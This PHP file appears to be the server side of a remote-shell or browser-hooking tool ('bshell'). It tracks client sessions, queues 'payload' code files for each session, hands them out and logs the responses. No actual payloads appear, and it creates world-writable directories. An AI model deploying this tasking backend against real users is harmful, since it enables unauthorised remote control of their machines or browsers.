<?php

class Log
{
  function loga($str) {
    //    print "$str\n";
    error_log($str."\n", 3, "bshell.log");
  }
}


class Session
{
  function put($session) {
    return Session::save_session($session);
  }

  function get($sessionId) {
    $session=false;
    if($sessionId)
      $session = self::load_session($sessionId);
    if($session && isset($session->isnew))
      unset($session->isnew);
    if($session === false)
      $session = self::create_session();
    return $session;
  }

  function updateLastActivity($session)
  {
    $session->last_activity = time();
    Session::put($session);
  }

  function isNew($session)
  {
    return isset($session->isnew);
  }

  function create_session()
  {
    $sessId = md5(rand().time().rand().microtime().rand());
    $session = new stdClass();
    $session->id = $sessId;
    $session->isnew = true;
    Log::loga("created new session: " . $sessId);
    return Session::save_session($session);
  }

  function save_session($session)
  {
    $fname = "sessions/".$session->id;
    if(file_put_contents($fname, json_encode($session), LOCK_EX))
      return $session;	
    return false;
	
  }

  function load_session($sessId)
  {
    $fname = "sessions/".$sessId;
    $session = false;
    if(strlen($sessId) == 32)
      if(file_exists($fname))
	$session = json_decode(file_get_contents($fname, LOCK_EX), false);
    return $session;
  }
}


class Payloads
{
  function init($sessionId, $copyInitial)
  {
    if(!is_dir("payloads"))
      mkdir("payloads", 0777);
    if(!is_dir("payloads" . DIRECTORY_SEPARATOR . $sessionId))
      mkdir("payloads" . DIRECTORY_SEPARATOR . $sessionId, 0777);
    if(!is_dir("payloads" . DIRECTORY_SEPARATOR . $sessionId. DIRECTORY_SEPARATOR . "res"))
      mkdir("payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . "res", 0777);
	
    if($copyInitial) {
      $sdir = "payloads" . DIRECTORY_SEPARATOR . "initial";
      $tdir = "payloads" . DIRECTORY_SEPARATOR .  $sessionId;
      if(is_dir($sdir)) {
	if( ($df = opendir($sdir)) != false) {
	  while($f = readdir($df)) {
	    if(is_file($sdir . DIRECTORY_SEPARATOR . $f))
	      file_put_contents($tdir . DIRECTORY_SEPARATOR . $f, file_get_contents($sdir . DIRECTORY_SEPARATOR . $f)); 
	  }
	}
      }	
    }
  }

  function scan($sessionId)
  {
    $code = false;
    $dir = "payloads/$sessionId";
    //    Log::loga("payload scan in $dir");
    if(is_dir($dir)) {
      if( ($df = opendir($dir)) != false) {
	while($f = readdir($df)) {
	  if($f !== "." && $f !== ".." && is_file($dir . DIRECTORY_SEPARATOR . $f)) {
	    Log::loga("payload file found: $dir/$f");
	    $code = array("id" => $f, "code" => file_get_contents($dir . DIRECTORY_SEPARATOR  . $f));
	    file_put_contents($dir . DIRECTORY_SEPARATOR  . "res" . DIRECTORY_SEPARATOR . $f, file_get_contents($dir . DIRECTORY_SEPARATOR . $f), FILE_APPEND);
	    unlink($dir . DIRECTORY_SEPARATOR . $f);
	  }
	}
      }
    }
    return $code;
  }

  function assign($type, $name, $sessionId) 
  {
    $fil = $type . DIRECTORY_SEPARATOR . $name;
    $dest = "payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . basename($name);
    if(is_file($fil))
      file_put_contents($dest, file_get_contents($fil));
    else
      Log::loga("Payload not found " . $name . " (". $fil . ")");
  }

  function response($sessionId, $cmdid, $response)
  {
    $cmdid = basename($cmdid);
    $fil = "payloads" . DIRECTORY_SEPARATOR . $sessionId . DIRECTORY_SEPARATOR . "res" . DIRECTORY_SEPARATOR . $cmdid;
    if(is_file($fil)) {
      $fil .= ".res";
      file_put_contents($fil, $response."\n", FILE_APPEND);
    }
  }
}

?>